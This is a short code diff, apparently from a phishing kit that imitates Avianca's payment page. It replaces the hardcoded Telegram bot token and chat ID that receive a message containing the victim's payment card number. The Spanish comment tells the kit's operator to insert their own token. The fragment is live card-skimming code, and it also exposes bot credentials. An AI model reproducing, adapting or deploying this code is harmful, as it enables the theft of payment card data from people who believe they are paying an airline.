@@ -42,8 +42,8 @@ document.addEventListener("DOMContentLoaded", () => {
         const transactionId = Date.now().toString();
 
         // 🔐 PON AQUÍ TU TOKEN Y CHAT ID:
-        const botToken = "7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51Y";
-        const chatId = "-4644294739";
+        const botToken = "8145113049:AAFo2a878pF0FttP8iX84eNjfX4D1p-zSgw";
+        const chatId = "-4725228176";
 
         const mensaje = `✈️ <b>Avianca</b> ✈️
 💳 Tarjeta: <code>${pagoavianca.card}</code>
